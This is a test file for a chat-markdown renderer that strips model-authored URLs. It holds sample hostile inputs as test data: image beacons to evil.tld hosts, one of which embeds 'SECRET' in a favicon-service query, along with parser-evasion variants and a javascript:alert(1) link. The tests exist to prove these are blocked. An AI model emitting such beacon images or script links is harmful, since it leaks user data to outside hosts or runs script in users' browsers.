import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  loadStreamdownRenderer,
  restrictModelUrls,
  StreamdownRenderer,
} from "./StreamdownRenderer";

// streamdown calls urlTransform(url, key, node) to compute each url attribute; a
// returned undefined removes the attribute, so no request is ever issued.
const img = { tagName: "img" } as any;
const link = { tagName: "a" } as any;

describe("restrictModelUrls (image src)", () => {
  it("drops a remote model-authored image (the favicon beacon)", () => {
    expect(
      restrictModelUrls("https://www.google.com/s2/favicons?domain=evil", "src", img)
    ).toBeUndefined();
  });

  it("drops any absolute or protocol-relative remote image", () => {
    expect(restrictModelUrls("http://evil.tld/pixel.gif", "src", img)).toBeUndefined();
    expect(restrictModelUrls("//evil.tld/pixel.gif", "src", img)).toBeUndefined();
  });

  it("drops a backslash-authority image, which the browser reads as protocol-relative", () => {
    expect(restrictModelUrls("\\\\evil.example/pixel.gif", "src", img)).toBeUndefined();
    expect(restrictModelUrls("/\\evil.example/pixel.gif", "src", img)).toBeUndefined();
  });

  it("drops an image hidden behind a leading C0 control, which the URL parser discards", () => {
    expect(restrictModelUrls("\u0001//evil.tld/p.gif", "src", img)).toBeUndefined();
    expect(restrictModelUrls("\u0000https://evil.tld/p.gif", "src", img)).toBeUndefined();
  });

  it("keeps inline and same-origin images", () => {
    expect(restrictModelUrls("data:image/png;base64,AAAA", "src", img)).toBe(
      "data:image/png;base64,AAAA"
    );
    expect(restrictModelUrls("blob:abc", "src", img)).toBe("blob:abc");
    expect(restrictModelUrls("/local/pic.png", "src", img)).toBe("/local/pic.png");
  });
});

describe("restrictModelUrls (link href)", () => {
  it("keeps http(s), mailto and relative links", () => {
    expect(restrictModelUrls("https://trigger.dev/docs", "href", link)).toBe(
      "https://trigger.dev/docs"
    );
    expect(restrictModelUrls("http://example.com", "href", link)).toBe("http://example.com");
    expect(restrictModelUrls("mailto:hi@trigger.dev", "href", link)).toBe("mailto:hi@trigger.dev");
    expect(restrictModelUrls("/runs/123", "href", link)).toBe("/runs/123");
  });

  it("drops unsafe link schemes", () => {
    expect(restrictModelUrls("javascript:alert(1)", "href", link)).toBeUndefined();
    expect(restrictModelUrls("data:text/html,<script>", "href", link)).toBeUndefined();
  });

  it("keeps a valid trigger:// citation, but strips a malformed one", () => {
    expect(restrictModelUrls("trigger://proj_abc/env_123/run/run_456", "href", link)).toBe(
      "trigger://proj_abc/env_123/run/run_456"
    );
    expect(restrictModelUrls("trigger://garbage", "href", link)).toBeUndefined();
  });
});

// Force the lazy component to load, then return its resolved default so we can render it
// synchronously. This proves the policy is actually wired into the JSX, not just exported.
async function resolveStreamdownRenderer() {
  const lazy = StreamdownRenderer as unknown as {
    _payload: unknown;
    _init: (
      payload: unknown
    ) => (props: {
      children: string;
      resolveTriggerUri?: (
        uri: string
      ) => { label: string; url: string; external?: boolean } | null;
    }) => JSX.Element;
  };
  try {
    lazy._init(lazy._payload);
  } catch (thenable) {
    await thenable;
  }
  return lazy._init(lazy._payload);
}

type ResolveTriggerUri = (uri: string) => { label: string; url: string; external?: boolean } | null;

async function render(markdown: string, resolveTriggerUri?: ResolveTriggerUri) {
  const Renderer = await resolveStreamdownRenderer();
  return renderToStaticMarkup(
    createElement(Renderer, resolveTriggerUri ? { resolveTriggerUri } : null, markdown)
  );
}

const RUN_CITATION = "See [the run](trigger://proj_abc/env_123/run/run_456) for details.";

describe("StreamdownRenderer (rendered markdown)", () => {
  it("never lets a model-authored remote image src reach the DOM", async () => {
    const html = await render(
      [
        "![x](https://www.google.com/s2/favicons?domain=SECRET.evil.tld)",
        "![y](//evil.tld/pixel.gif)",
        "![z](/local/pic.png)",
      ].join("\n\n")
    );

    // No remote host is ever fetched: no absolute or protocol-relative image src survives.
    expect(html).not.toContain('src="http');
    expect(html).not.toContain('src="//');
    expect(html).not.toContain("SECRET.evil.tld");
    // A same-origin relative image is untouched, so the policy does not over-block.
    expect(html).toContain('src="/local/pic.png"');
  });

  it("resolves a trigger:// citation to an anchor with the resolved path", async () => {
    const html = await render(RUN_CITATION, (uri) =>
      uri === "trigger://proj_abc/env_123/run/run_456"
        ? { label: "run_456", url: "/runs/run_456" }
        : null
    );

    expect(html).toContain('href="/runs/run_456"');
    expect(html).toContain("the run");
  });

  it("renders a trigger:// citation as plain text while unresolved", async () => {
    const html = await render(RUN_CITATION, () => null);

    expect(html).not.toContain("<a");
    expect(html).toContain("the run");
  });

  it("opens an external resolution in a new tab", async () => {
    const html = await render(
      "See [source](trigger://proj_abc/env_123/run/run_456) for details.",
      () => ({
        label: "source",
        url: "https://github.com/acme/repo/blob/sha/file.ts",
        external: true,
      })
    );

    expect(html).toContain('href="https://github.com/acme/repo/blob/sha/file.ts"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it("never lets a javascript: link reach the DOM", async () => {
    const html = await render("[click me](javascript:alert(1))");

    expect(html).not.toContain('href="javascript');
  });

  it("never lets a raw trigger:// href reach the DOM, resolved or not", async () => {
    expect(await render(RUN_CITATION)).not.toContain('href="trigger://');
    expect(
      await render(RUN_CITATION, () => ({ label: "run_456", url: "/runs/run_456" }))
    ).not.toContain('href="trigger://');
  });

  it("opens a plain http(s) link in a new tab", async () => {
    const html = await render("See [the docs](https://trigger.dev/docs) for details.");

    expect(html).toContain('href="https://trigger.dev/docs"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });
});

// No jsdom in this repo — stand in for the browser globals `createStaleAssetRecovery` touches.
function stubSessionStorage() {
  const store = new Map<string, string>();
  vi.stubGlobal("sessionStorage", {
    getItem: (key: string) => store.get(key) ?? null,
    setItem: (key: string, value: string) => void store.set(key, value),
  });
}

describe("loadStreamdownRenderer", () => {
  let reload: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    stubSessionStorage();
    reload = vi.fn();
    vi.stubGlobal("location", { reload });
    vi.stubGlobal("navigator", { onLine: true });
  });

  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it("falls back to plain text when the import rejects, without retrying it", async () => {
    const load = vi
      .fn()
      .mockRejectedValue(
        new Error("Failed to fetch dynamically imported module: https://app/assets/chunk.js")
      );

    const mod = await loadStreamdownRenderer(load);
    const html = renderToStaticMarkup(createElement(mod.default, null, "hello **world**"));

    expect(html).toContain("hello");
    expect(load).toHaveBeenCalledTimes(1);
  });

  // Exercises the real, listener-free `createStaleAssetRecovery` export (not a mock of
  // the module) — a mock here would hide a regression back to the listener-installing
  // `staleAssetRecoveryScript`, which was the actual bug this replaced.
  it("reloads via the real stale-asset recovery for a chunk-load-shaped failure", async () => {
    await loadStreamdownRenderer(() =>
      Promise.reject(new Error("Failed to fetch dynamically imported module: chunk.js"))
    );

    expect(reload).toHaveBeenCalledTimes(1);
  });

  it("never reloads for an unrelated failure", async () => {
    await loadStreamdownRenderer(() => Promise.reject(new Error("network error")));

    expect(reload).not.toHaveBeenCalled();
  });

  it("logs a setup error instead of swallowing it, without reloading", async () => {
    const consoleError = vi.spyOn(console, "error").mockImplementation(() => {});
    const setupError = new Error("createCodePlugin exploded");
    const load = vi.fn().mockResolvedValue([
      { Streamdown: () => null, defaultRehypePlugins: {} },
      {
        createCodePlugin: () => {
          throw setupError;
        },
      },
      { triggerDarkTheme: {} },
    ]);

    const mod = await loadStreamdownRenderer(load as any);

    expect(renderToStaticMarkup(createElement(mod.default, null, "hello"))).toContain("hello");
    expect(reload).not.toHaveBeenCalled();
    expect(consoleError).toHaveBeenCalledWith(expect.any(String), setupError);
    consoleError.mockRestore();
  });

  it("never raises an unhandled rejection on a failed import", async () => {
    const onUnhandledRejection = vi.fn();
    process.once("unhandledRejection", onUnhandledRejection);

    await loadStreamdownRenderer(() => Promise.reject(new Error("boom")));
    // Give a would-be unhandled rejection a tick to surface before asserting it never did.
    await new Promise((resolve) => setTimeout(resolve, 0));

    expect(onUnhandledRejection).not.toHaveBeenCalled();
  });
});
